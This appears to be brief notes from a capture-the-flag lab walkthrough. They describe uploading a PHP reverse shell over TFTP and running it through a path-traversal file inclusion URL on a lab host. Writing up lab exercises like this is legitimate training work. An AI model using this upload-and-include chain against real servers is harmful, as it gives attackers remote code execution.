we can connect to tftp with just
`tftp 10.10.10.55`

we can upload a rev php shell by doing
`put reverse.php`

after googling a bit, we find out that the default directory for tftp is
`/var/lib/tftpboot`

We can execute the rev shell going to this address:
`http://10.10.10.55/?file=../../../../../var/lib/tftpboot/reverse.php`


tryhackme.com/api/tasks/roomname